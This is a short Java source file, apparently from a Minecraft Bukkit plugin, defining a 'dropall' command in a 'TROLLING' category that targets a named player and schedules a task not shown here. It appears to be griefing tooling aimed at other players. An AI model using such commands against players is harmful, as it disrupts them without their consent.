package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;

public class Command_DROPALL extends CommandBase implements Listener {

    public Command_DROPALL() {
        super("dropall", "<Spieler>", Category.TROLLING);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_DROPALL2(this, args, p));
        }
    }

}
